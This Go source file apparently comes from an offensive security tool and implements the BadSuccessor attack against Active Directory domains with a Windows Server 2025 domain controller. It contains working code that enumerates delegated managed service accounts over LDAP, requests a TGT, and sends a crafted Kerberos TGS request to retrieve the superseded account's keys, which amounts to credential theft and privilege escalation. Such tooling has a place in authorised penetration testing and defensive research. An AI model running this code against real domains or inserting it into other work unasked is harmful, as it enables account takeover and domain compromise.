package smbclient

import (
	"encoding/binary"
	"errors"
	"fmt"
	"io"
	"strconv"
	"strings"
	"time"

	"github.com/mandiant/gopacket/pkg/kerberos"
	"github.com/mandiant/gopacket/pkg/ldap"
	"github.com/mandiant/gopacket/pkg/security"
	"github.com/mandiant/gopacket/pkg/third_party/gokrb5/messages"
	"github.com/mandiant/gopacket/pkg/transport"

	"anvil/internal/dmsa"
	"anvil/internal/ui"
)

// badsuccessor.go implements the BadSuccessor attack (dMSA abuse, Akamai,
// May 2025) against domains with a Windows Server 2025 DC:
//
//   - FindDMSAs enumerates dMSA objects (objectClass
//     msDS-DelegatedManagedServiceAccount) and the attributes that make
//     them dangerous — migration state, the superseded account link, and
//     who may retrieve the managed password — over one transient LDAP
//     channel.
//   - GetDMSAKeys runs the KERB-SUPERSEDED key path against the KDC: a
//     TGT for the caller, then an S4U2Self-style TGS-REQ for the dMSA
//     that makes a 2025 KDC hand back a dMSA TGT (PAC inherits the
//     superseded account's groups) plus the KERB-DMSA-KEY-PACKAGE with
//     the superseded account's keys.
//
// Both halves are read-only — nothing is created or modified on the DC.
// dMSA does not exist before Server 2025: on older DCs the schema class
// is absent and every entry point fails with ErrDMSANotSupported.

// ErrDMSANotSupported is returned when the domain's schema has no
// msDS-DelegatedManagedServiceAccount class — i.e. no Windows Server
// 2025 DC ever extended the schema. Themed, session survives; callers
// test it with errors.Is.
var ErrDMSANotSupported = errors.New("not supported on this server (no dMSA schema — dMSA requires a Windows Server 2025 DC)")

// dmsaClassSchemaDN is the schema object's relative DN (classSchema CN is
// the lDAPDisplayName with camel case folded to hyphens).
const dmsaClassSchemaDN = "CN=ms-DS-Delegated-Managed-Service-Account,CN=Schema,CN=Configuration"

// dmsaAttrs are the attributes BadSuccessor cares about (mirrors
// gopacket's tools/badsuccessor enumeration set).
var dmsaAttrs = []string{
	"sAMAccountName",
	"dNSHostName",
	"msDS-DelegatedMSAState",
	"msDS-ManagedAccountPrecededByLink",
	"msDS-GroupMSAMembership",
	"msDS-SupportedEncryptionTypes",
	"servicePrincipalName",
	"whenCreated",
}

// DMSAAccount is one enumerated dMSA object.
type DMSAAccount struct {
	Name              string   // sAMAccountName (ends in $)
	DN                string   // distinguishedName
	DNSHostName       string   // dNSHostName
	State             int      // msDS-DelegatedMSAState: 1 in-progress, 2 completed, 3 standalone
	PrecededBy        string   // DN of the superseded account (msDS-ManagedAccountPrecededByLink)
	PrincipalsAllowed []string // principals in msDS-GroupMSAMembership (DOMAIN\name, or raw SID when unresolvable)
	EncTypes          int64    // msDS-SupportedEncryptionTypes bitmask
	SPNs              []string // servicePrincipalName
	WhenCreated       string   // whenCreated (LDAP generalized time, raw)
}

// StateName renders msDS-DelegatedMSAState (undocumented by Microsoft;
// values from Akamai's behavioral analysis).
func (a DMSAAccount) StateName() string {
	switch a.State {
	case 1:
		return "migration in progress"
	case 2:
		return "migration completed"
	case 3:
		return "standalone"
	default:
		return "unknown"
	}
}

// FindDMSAs lists every dMSA in the domain with the attributes relevant
// to BadSuccessor. One transient LDAP channel; read-only. Returns
// ErrDMSANotSupported when the schema has no dMSA class (any forest
// without a Windows Server 2025 DC).
func (s *Session) FindDMSAs() ([]DMSAAccount, error) {
	cl, cleanup, err := s.openLDAP()
	if err != nil {
		return nil, err
	}
	defer cleanup()

	baseDN, err := cl.GetDefaultNamingContext()
	if err != nil {
		return nil, fmt.Errorf("naming context: %v", err)
	}

	// Gate on the schema class: without a Server 2025 schema extension the
	// objectClass cannot exist, and the themed message is the answer.
	classDN := dmsaClassSchemaDN + "," + baseDN
	res, err := cl.SearchBase(classDN, "(objectClass=*)", []string{"cn"})
	if err != nil || len(res.Entries) == 0 {
		return nil, ErrDMSANotSupported
	}

	res, err = cl.Search(baseDN, "(objectClass=msDS-DelegatedManagedServiceAccount)", dmsaAttrs)
	if err != nil {
		return nil, fmt.Errorf("dMSA search: %v", err)
	}

	var out []DMSAAccount
	for _, e := range res.Entries {
		a := DMSAAccount{
			Name:        e.GetAttributeValue("sAMAccountName"),
			DN:          e.DN,
			DNSHostName: e.GetAttributeValue("dNSHostName"),
			PrecededBy:  e.GetAttributeValue("msDS-ManagedAccountPrecededByLink"),
			SPNs:        e.GetAttributeValues("servicePrincipalName"),
			WhenCreated: e.GetAttributeValue("whenCreated"),
		}
		if v, err := strconv.Atoi(e.GetAttributeValue("msDS-DelegatedMSAState")); err == nil {
			a.State = v
		}
		if v, err := strconv.ParseInt(e.GetAttributeValue("msDS-SupportedEncryptionTypes"), 10, 64); err == nil {
			a.EncTypes = v
		}
		a.PrincipalsAllowed = parseGroupMSAMembership(cl, baseDN, e.GetRawAttributeValue("msDS-GroupMSAMembership"))
		out = append(out, a)
	}
	ui.Debugf("badsuccessor: %d dMSA objects found", len(out))
	return out, nil
}

// parseGroupMSAMembership decodes the security descriptor in
// msDS-GroupMSAMembership to the SIDs allowed to retrieve the dMSA's
// managed password, resolving names best-effort over the already-open
// channel (rbcd.go's resolveSIDName). Malformed/absent values yield nil,
// never an error — the attribute is optional.
func parseGroupMSAMembership(cl *ldap.Client, baseDN string, raw []byte) []string {
	if len(raw) == 0 {
		return nil
	}
	sd, err := security.ParseSecurityDescriptor(raw)
	if err != nil || sd.DACL == nil {
		return nil
	}
	seen := map[string]bool{}
	var out []string
	for _, ace := range sd.DACL.ACEs {
		sid := ace.SID.String()
		if seen[sid] {
			continue
		}
		seen[sid] = true
		if name := resolveSIDName(cl, baseDN, sid); name != "" {
			out = append(out, name)
		} else {
			out = append(out, sid)
		}
	}
	return out
}

// GetDMSAKeys runs the KERB-SUPERSEDED key path for one dMSA: requests a
// TGT for the session account, then asks the KDC for a dMSA TGT via the
// S4U2Self-style dMSA request, returning the dMSA TGT plus the
// KERB-DMSA-KEY-PACKAGE (the superseded account's keys sit in
// PreviousKeys). Two transient KDC channels (AS, then TGS), opened once
// each; read-only on the DC. The caller must be listed in the dMSA's
// msDS-GroupMSAMembership, and the KDC must be Server 2025.
func (s *Session) GetDMSAKeys(dmsaName string) (*dmsa.Reply, error) {
	realm := s.dnsRealm()
	if realm == "" {
		return nil, fmt.Errorf("kerberos realm unknown — pass -d <domain>")
	}
	if !strings.HasSuffix(dmsaName, "$") {
		dmsaName += "$" // dMSA sAMAccountNames are machine-style
	}

	nthash := ""
	if s.creds.Hash != "" {
		h, err := kerberos.ParseHashes(s.creds.Hash)
		if err != nil {
			return nil, err
		}
		nthash = h
	}
	if s.creds.Password == "" && nthash == "" {
		return nil, fmt.Errorf("password or --hashes required for the dMSA key request")
	}

	tgtRes, err := kerberos.GetTGT(&kerberos.TGTRequest{
		Username: s.creds.Username,
		Password: s.creds.Password,
		Domain:   realm,
		NTHash:   nthash,
		DCIP:     s.creds.DCIP,
		DCHost:   s.host,
	})
	if err != nil {
		return nil, mapDMSAError(err)
	}

	var tgt messages.Ticket
	if err := tgt.Unmarshal(tgtRes.Ticket); err != nil {
		return nil, fmt.Errorf("unmarshal TGT: %v", err)
	}

	reqBytes, err := dmsa.BuildDMSATGSReq(tgt, tgtRes.SessionKey, s.creds.Username, realm, dmsaName)
	if err != nil {
		return nil, err
	}

	kdc := s.creds.DCIP
	if kdc == "" {
		kdc = s.host
	}
	resp, err := kdcExchange(kdc, reqBytes)
	if err != nil {
		return nil, fmt.Errorf("KDC: %v", err)
	}

	reply, err := dmsa.ParseDMSATGSRep(resp, tgtRes.SessionKey)
	if err != nil {
		return nil, mapDMSAError(err)
	}
	return reply, nil
}

// dnsRealm resolves the Kerberos realm in DNS form (uppercase), which the
// KDC requires — the NetBIOS domain fails with "CRealm does not match"
// (same constraint as internal/roast).
func (s *Session) dnsRealm() string {
	_, tree := s.ServerInfo()
	if tree != "" {
		return strings.ToUpper(tree)
	}
	return strings.ToUpper(s.creds.Domain)
}

// kdcExchange sends one TGS-REQ to the KDC over TCP (length-prefixed per
// RFC 4120 §7.2.2) and returns the raw reply. Mirrors gopacket's
// unexported sendKDCRequest: 10s deadline, 1 MiB response cap.
func kdcExchange(kdcHost string, data []byte) ([]byte, error) {
	addr := kerberos.FormatKDC(kdcHost, "88")
	conn, err := transport.Dial("tcp", addr)
	if err != nil {
		return nil, err
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(10 * time.Second))

	header := make([]byte, 4)
	binary.BigEndian.PutUint32(header, uint32(len(data)))
	if _, err := conn.Write(append(header, data...)); err != nil {
		return nil, err
	}
	if _, err := io.ReadFull(conn, header); err != nil {
		return nil, err
	}
	respLen := binary.BigEndian.Uint32(header)
	if respLen > 1<<20 {
		return nil, fmt.Errorf("response too large: %d bytes", respLen)
	}
	resp := make([]byte, respLen)
	if _, err := io.ReadFull(conn, resp); err != nil {
		return nil, err
	}
	return resp, nil
}

// mapDMSAError renders raw KDC errors as themed one-liners (errors.go
// style). The codes anvil interprets:
//
//	6  KDC_ERR_C_PRINCIPAL_UNKNOWN — the dMSA does not exist here.
//	7  KDC_ERR_S_PRINCIPAL_UNKNOWN — krbtgt lookup failed (realm wrong).
//	13 KDC_ERR_BADOPTION — the KDC refused the request options.
//	36 KRB_AP_ERR_BADMATCH / 41 KRB_AP_ERR_MODIFIED — how a pre-2025 KDC
//	   refuses the dMSA request shape (verified against Windows Server
//	   2022: impacket's merged -dmsa implementation draws the identical
//	   codes for byte-identical requests; a 2025 KDC with an authorized
//	   caller answers with the key package instead).
func mapDMSAError(err error) error {
	var kerr *dmsa.KDCError
	if !errors.As(err, &kerr) {
		msg := err.Error()
		if strings.Contains(msg, "KDC_ERR_PREAUTH_FAILED") {
			return fmt.Errorf("kerberos: bad password (pre-auth failed)")
		}
		return err
	}
	suffix := ""
	if kerr.Superseded != nil {
		suffix = fmt.Sprintf(" (superseded by %s)", kerr.Superseded)
	}
	switch kerr.Code {
	case 6:
		return fmt.Errorf("dMSA not found (no such account — or this KDC has no dMSA support; dMSA requires Windows Server 2025)%s", suffix)
	case 7:
		return fmt.Errorf("krbtgt service not found — check the realm (-d)%s", suffix)
	case 13:
		return fmt.Errorf("request refused (caller is likely not in the dMSA's msDS-GroupMSAMembership)%s", suffix)
	case 36, 41:
		return fmt.Errorf("dMSA request refused by the KDC (not supported on this server — dMSA requires Windows Server 2025, or the target is not a migrated dMSA)%s", suffix)
	}
	return fmt.Errorf("%v%s", err, suffix)
}
